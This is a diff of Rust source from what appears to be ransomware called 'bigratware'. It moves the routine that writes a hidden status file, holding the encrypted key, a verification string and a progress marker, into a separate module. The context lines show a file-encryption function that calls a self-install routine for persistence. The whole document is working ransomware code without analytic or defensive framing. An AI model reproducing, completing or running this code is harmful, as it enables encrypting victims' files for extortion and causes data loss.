@@ -1,7 +1,7 @@
 use std::fs::{File, OpenOptions};
 use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
-use anyhow::{anyhow, Context, Result};
+use anyhow::{Context, Result};
 use chacha20poly1305::aead::OsRng;
 use chacha20poly1305::aead::stream::EncryptorBE32;
 use chacha20poly1305::{KeyInit, XChaCha20Poly1305};
@@ -11,10 +11,8 @@ use rsa::{Oaep, RsaPublicKey};
 use sha2::Sha512;
 use decryptor::helpers::gen_new_path;
 use crate::BIGRAT_PNG;
-
-#[cfg(windows)]
-use std::os::windows::fs::OpenOptionsExt;
 use crate::startup::install_self;
+use crate::status_file::create_status_file;
 
 const BUFFER_SIZE: usize = 500;
 
@@ -151,49 +149,4 @@ pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut Thre
     install_self()?;
 
     Ok(())
-}
-
-fn create_status_file(
-    path: &Path,
-    encrypted_key: &[u8],
-    encrypted_nonce: &[u8],
-    key: &[u8; 32],
-    nonce: &[u8; 19],
-) -> Result<File> {
-    let err_context = || "Failed to create a status file";
-    #[cfg(not(windows))]
-    let mut status_file = OpenOptions::new()
-        .write(true)
-        .create(true)
-        .open(path.join(".bigrat-status"))
-        .with_context(err_context)?;
-    #[cfg(windows)]
-    let mut status_file = OpenOptions::new()
-        .write(true)
-        .create(true)
-        .attributes(0x2)  // hidden file
-        .open(path.join(".bigrat-status"))
-        .with_context(err_context)?;
-    status_file.write_all(BIGRAT_PNG).with_context(err_context)?;
-    status_file.write_all(encrypted_key).with_context(err_context)?;
-    status_file.write_all(encrypted_nonce).with_context(err_context)?;
-
-    let aead = XChaCha20Poly1305::new(key.into());
-    let stream_encryptor = EncryptorBE32::from_aead(aead, nonce.as_ref().into());
-    let encrypted_verify_str = stream_encryptor
-        .encrypt_last(STATUS_VERIFY_STR.as_slice())
-        .map_err(|err| anyhow!("Failed to encrypt status verification text: {err}"))?;
-    assert_eq!(
-        STATUS_VERIFY_ENCRYPTED_STR_LEN,
-        encrypted_verify_str.len(),
-        "Length of the encrypted status verification text ({}) does not match the expected length ({}). \
-        Did you change it in the source code?",
-        encrypted_verify_str.len(),
-        STATUS_VERIFY_ENCRYPTED_STR_LEN,
-    );
-    status_file.write_all(&encrypted_verify_str).with_context(err_context)?;
-
-    status_file.write_all(b"BIGRATWARE_STATUS=started;").with_context(err_context)?;
-
-    Ok(status_file)
 }
